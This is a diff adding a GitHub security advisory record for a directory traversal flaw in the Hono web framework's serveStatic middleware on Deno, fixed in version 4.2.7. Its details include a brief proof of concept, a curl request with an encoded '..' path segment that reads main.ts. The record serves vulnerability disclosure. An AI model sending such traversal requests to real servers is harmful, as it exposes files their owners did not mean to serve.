@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-3mpf-rcc7-5347",
+  "modified": "2024-04-24T14:26:48Z",
+  "published": "2024-04-23T16:20:49Z",
+  "aliases": [
+    "CVE-2024-32869"
+  ],
+  "summary": "Hono vulnerable to Restricted Directory Traversal in serveStatic with deno",
+  "details": "### Summary\n\nWhen using serveStatic with deno, it is possible to directory traverse where main.ts is located.\n\nMy environment is configured as per this tutorial\nhttps://hono.dev/getting-started/deno\n\n### PoC\n\n```bash\n$ tree\n.\n├── deno.json\n├── deno.lock\n├── main.ts\n├── README.md\n└── static\n    └── a.txt\n```\n\nsource\n\n```jsx\nimport { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'\nimport { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'\n\nconst app = new Hono()\napp.use('/static/*', serveStatic({ root: './' }))\n\nDeno.serve(app.fetch)\n```\n\nrequest\n\n```bash\ncurl localhost:8000/static/%2e%2e/main.ts\n```\n\nresponse is content of main.ts\n\n### Impact\n\nUnexpected files are retrieved.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.7"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32869"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-23T16:20:49Z",
+    "nvd_published_at": "2024-04-23T21:15:48Z"
+  }
+}
